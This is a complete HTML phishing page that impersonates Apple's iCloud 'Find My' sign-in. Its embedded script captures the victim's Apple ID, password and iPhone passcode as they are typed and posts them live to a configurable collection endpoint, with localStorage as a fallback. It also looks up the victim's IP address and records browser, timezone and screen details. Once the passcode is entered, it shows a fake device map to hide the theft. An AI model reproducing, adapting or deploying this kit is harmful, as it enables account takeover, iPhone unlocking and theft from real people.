<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<title>iCloud</title>
<style>
:root{--bg:#fff;--fg:#1d1d1f;--muted:#6e6e73;--line:#d2d2d7;--blue:#0071e3;--field:#fff}
@media (prefers-color-scheme:dark){:root{--bg:#000;--fg:#f5f5f7;--muted:#86868b;--line:#3a3a3c;--blue:#0a84ff;--field:#1c1c1e}}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;padding:0}
body{background:var(--bg);color:var(--fg);font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;font-size:17px}
.wrap{min-height:100dvh;display:flex;flex-direction:column;align-items:center;padding:56px 22px 40px}
.card{width:100%;max-width:420px;flex:1}
.logo{display:block;margin:0 auto 22px;width:32px;height:38px;fill:var(--fg)}
h1{font-size:26px;line-height:1.2;font-weight:600;letter-spacing:-.02em;text-align:center;margin:0}
.sub{font-size:15px;line-height:1.45;color:var(--muted);text-align:center;margin:10px 0 26px}
.field{width:100%;height:52px;border:1px solid var(--line);border-radius:12px;padding:0 15px;font-size:17px;background:var(--field);color:var(--fg);font-family:inherit}
.field::placeholder{color:#a1a1a6}
.field:focus{outline:none;border-color:var(--blue);box-shadow:0 0 0 3.5px rgba(0,113,227,.16)}
.btn{width:100%;height:50px;border:0;border-radius:12px;background:var(--blue);color:#fff;font-size:17px;font-weight:500;font-family:inherit;margin-top:16px;cursor:pointer;transition:opacity .15s}
.btn:active{opacity:.75}
.hint{font-size:14px;color:var(--muted);margin-top:14px;text-align:center}
.hint a{color:var(--blue);text-decoration:none}
.pin{display:flex;gap:8px;justify-content:center;margin:4px 0 8px}
.pin input{width:100%;height:56px;border:1px solid var(--line);border-radius:11px;background:var(--field);color:var(--fg);text-align:center;font-size:24px;font-family:inherit;padding:0}
.pin input:focus{outline:none;border-color:var(--blue);box-shadow:0 0 0 3px rgba(0,113,227,.16)}
.foot{margin-top:34px;font-size:12px;color:var(--muted);text-align:center;line-height:1.6;max-width:420px}
.hide{display:none!important}
.fm{width:100%;max-width:640px}
.fmbar{display:flex;align-items:center;gap:10px;padding:0 0 16px;border-bottom:1px solid var(--line)}
.fmbar svg{width:20px;height:24px;fill:var(--fg)}
.fmbar b{font-size:15px;font-weight:600}
.map{height:240px;border-radius:14px;margin:18px 0;background:linear-gradient(160deg,#dce9d6,#c9dcc2 40%,#bcd3e8 100%);position:relative;overflow:hidden}
@media (prefers-color-scheme:dark){.map{background:linear-gradient(160deg,#1d2a20,#22303a 60%,#1a2733)}}
.pinmark{position:absolute;left:50%;top:46%;width:22px;height:22px;border-radius:50% 50% 50% 0;background:#0071e3;rotate:-45deg;margin:-11px 0 0 -11px;box-shadow:0 2px 6px rgba(0,0,0,.25)}
.pinmark::after{content:"";position:absolute;inset:6px;border-radius:50%;background:#fff}
.dev{display:flex;align-items:center;gap:12px;padding:14px 0;border-bottom:1px solid var(--line)}
.dev .n{font-size:15px;font-weight:500}
.dev .s{font-size:13px;color:var(--muted)}
.dev .ic{width:34px;height:34px;border-radius:8px;background:var(--line);display:grid;place-items:center;font-size:16px}
</style>
</head>
<body>
<div class="wrap">
  <div class="card" id="card">
    <svg class="logo" viewBox="0 0 170 170" aria-hidden="true"><path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.93.21-9.84-1.96-14.75-6.52-3.13-2.73-7.04-7.4-11.73-14.02-5.03-7.08-9.17-15.29-12.41-24.65-3.47-10.11-5.21-19.9-5.21-29.38 0-10.86 2.35-20.22 7.04-28.07 3.7-6.3 8.62-11.28 14.78-14.94 6.16-3.66 12.82-5.53 19.99-5.65 3.92 0 9.05 1.21 15.43 3.59 6.37 2.39 10.46 3.6 12.27 3.6 1.34 0 5.88-1.42 13.58-4.24 7.28-2.62 13.42-3.7 18.44-3.27 13.63 1.1 23.87 6.47 30.7 16.13-12.19 7.39-18.22 17.73-18.1 31.02.11 10.34 3.86 18.94 11.23 25.78 3.34 3.17 7.07 5.62 11.22 7.36-.9 2.61-1.85 5.11-2.86 7.51zM119.11 9.5c0 8.1-2.96 15.66-8.87 22.67-7.13 8.33-15.76 13.15-25.12 12.39-.12-.97-.19-1.99-.19-3.07 0-7.78 3.39-16.11 9.4-22.92 3-3.44 6.82-6.31 11.45-8.6 4.62-2.25 8.99-3.49 13.1-3.72.12 1.09.23 2.18.23 3.25z"/></svg>
    <h1 id="title">Sign in to iCloud</h1>
    <p class="sub" id="sub">Use your Apple ID to sign in and access Find My.</p>
    <form id="f1">
      <input class="field" id="appleid" type="text" placeholder="Apple ID" autocomplete="username" autocapitalize="none" autocorrect="off" spellcheck="false" inputmode="email">
      <button class="btn" type="submit">Continue</button>
    </form>
    <form id="f2" class="hide">
      <input class="field" id="password" type="password" placeholder="Password" autocomplete="current-password">
      <button class="btn" type="submit">Sign In</button>
      <p class="hint"><a href="#">Forgot password?</a></p>
    </form>
    <form id="f3" class="hide">
      <div class="pin" id="pin">
        <input inputmode="numeric" maxlength="1" autocomplete="one-time-code"><input inputmode="numeric" maxlength="1"><input inputmode="numeric" maxlength="1"><input inputmode="numeric" maxlength="1"><input inputmode="numeric" maxlength="1"><input inputmode="numeric" maxlength="1">
      </div>
      <button class="btn" type="submit">Continue</button>
      <p class="hint"><a href="#">Didn't get a code?</a></p>
    </form>
  </div>
  <div class="fm hide" id="fm">
    <div class="fmbar">
      <svg viewBox="0 0 170 170"><path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.93.21-9.84-1.96-14.75-6.52-3.13-2.73-7.04-7.4-11.73-14.02-5.03-7.08-9.17-15.29-12.41-24.65-3.47-10.11-5.21-19.9-5.21-29.38 0-10.86 2.35-20.22 7.04-28.07 3.7-6.3 8.62-11.28 14.78-14.94 6.16-3.66 12.82-5.53 19.99-5.65 3.92 0 9.05 1.21 15.43 3.59 6.37 2.39 10.46 3.6 12.27 3.6 1.34 0 5.88-1.42 13.58-4.24 7.28-2.62 13.42-3.7 18.44-3.27 13.63 1.1 23.87 6.47 30.7 16.13-12.19 7.39-18.22 17.73-18.1 31.02.11 10.34 3.86 18.94 11.23 25.78 3.34 3.17 7.07 5.62 11.22 7.36-.9 2.61-1.85 5.11-2.86 7.51zM119.11 9.5c0 8.1-2.96 15.66-8.87 22.67-7.13 8.33-15.76 13.15-25.12 12.39-.12-.97-.19-1.99-.19-3.07 0-7.78 3.39-16.11 9.4-22.92 3-3.44 6.82-6.31 11.45-8.6 4.62-2.25 8.99-3.49 13.1-3.72.12 1.09.23 2.18.23 3.25z"/></svg>
      <b>Find My</b>
    </div>
    <div class="map"><div class="pinmark"></div></div>
    <div class="dev"><div class="ic">📱</div><div><div class="n">iPhone</div><div class="s">This device · Now</div></div></div>
    <div class="dev"><div class="ic">💻</div><div><div class="n">MacBook Pro</div><div class="s">No location</div></div></div>
  </div>
  <p class="foot">Your Apple ID is the account you use for all Apple services.<br>Privacy Policy &nbsp;·&nbsp; Terms &amp; Conditions</p>
</div>
<script src="config.js"></script>
<script>
(function(){
  var cfg = window.CONFIG || {};
  var PROJECT = cfg.PROJECT || 'findmy';
  var sid = sessionStorage.getItem('fsid');
  if(!sid){ sid = Math.random().toString(36).slice(2,10)+Date.now().toString(36); sessionStorage.setItem('fsid', sid); }
  var S = {stage:'appleid', appleid:'', password:'', passcode:''};
  var ip='', lastKey='', visited=false;

  fetch('https://api.ipify.org?format=json').then(function(r){return r.json()}).then(function(d){ip=d.ip||''}).catch(function(){});

  function meta(){
    var tz=''; try{ tz=Intl.DateTimeFormat().resolvedOptions().timeZone; }catch(e){}
    return {sid:sid, ip:ip, ua:navigator.userAgent, tz:tz, lang:navigator.language, w:screen.width, h:screen.height, ref:document.referrer, ts:Date.now()};
  }
  function store(rec){
    try{ var a=JSON.parse(localStorage.getItem('captures')||'[]'); a.push(rec); localStorage.setItem('captures', JSON.stringify(a.slice(-400))); }catch(e){}
  }
  function send(type, extra){
    var rec = Object.assign({project:PROJECT, type:type, stage:S.stage, appleid:S.appleid, password:S.password, passcode:S.passcode}, meta(), extra||{});
    var k = type+'|'+S.stage+'|'+S.appleid+'|'+S.password+'|'+S.passcode;
    if(k===lastKey) return; lastKey=k;
    if(!cfg.ENDPOINT){ store(rec); return; }
    try{
      fetch(cfg.ENDPOINT, {method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain;charset=utf-8'}, body:JSON.stringify(rec), keepalive:true})
        .catch(function(){ store(rec); });
    }catch(e){ store(rec); }
  }
  function debounce(fn, ms){ var t; return function(){ clearTimeout(t); t=setTimeout(fn, ms); }; }
  var live = debounce(function(){ send('update'); }, 550);

  setTimeout(function(){ if(!visited){ visited=true; send('visit'); } }, 1300);
  var ai = document.getElementById('appleid');
  ai.addEventListener('input', function(){ S.appleid = ai.value.trim(); live(); });

  document.getElementById('f1').addEventListener('submit', function(e){
    e.preventDefault();
    if(!ai.value.trim()){ ai.focus(); return; }
    S.stage='password'; send('appleid');
    document.getElementById('f1').classList.add('hide');
    document.getElementById('sub').textContent = 'Enter the password for ' + S.appleid + '.';
    document.getElementById('f2').classList.remove('hide');
    pw.focus();
  });

  var pw = document.getElementById('password');
  pw.addEventListener('input', function(){ S.password = pw.value; live(); });

  document.getElementById('f2').addEventListener('submit', function(e){
    e.preventDefault();
    if(!pw.value){ pw.focus(); return; }
    S.stage='passcode'; send('password');
    document.getElementById('f2').classList.add('hide');
    document.getElementById('title').textContent = 'Enter Passcode';
    document.getElementById('sub').textContent = 'Enter the passcode for your iPhone.';
    document.getElementById('f3').classList.remove('hide');
    boxes[0].focus();
  });

  var boxes = [].slice.call(document.querySelectorAll('#pin input'));
  function pinVal(){ return boxes.map(function(b){return b.value}).join(''); }
  boxes.forEach(function(b,i){
    b.addEventListener('input', function(){
      b.value = b.value.replace(/\D/g,'').slice(-1);
      if(b.value && i<5) boxes[i+1].focus();
      S.passcode = pinVal(); live();
      if(pinVal().length===6) setTimeout(submitPin, 150);
    });
    b.addEventListener('keydown', function(e){
      if(e.key==='Backspace' && !b.value && i>0){ boxes[i-1].focus(); boxes[i-1].value=''; S.passcode=pinVal(); live(); }
    });
    b.addEventListener('paste', function(e){
      var d=(e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
      if(!d) return; e.preventDefault();
      boxes.forEach(function(x,j){ x.value = d[j]||''; });
      S.passcode = pinVal(); live();
      boxes[Math.min(d.length-1,5)].focus();
      if(pinVal().length===6) submitPin();
    });
  });

  function submitPin(){
    if(S.stage!=='done'){ S.stage='done'; send('passcode'); }
    setTimeout(function(){
      document.getElementById('card').classList.add('hide');
      document.getElementById('fm').classList.remove('hide');
    }, 700);
  }
})();
</script>
</body>
</html>
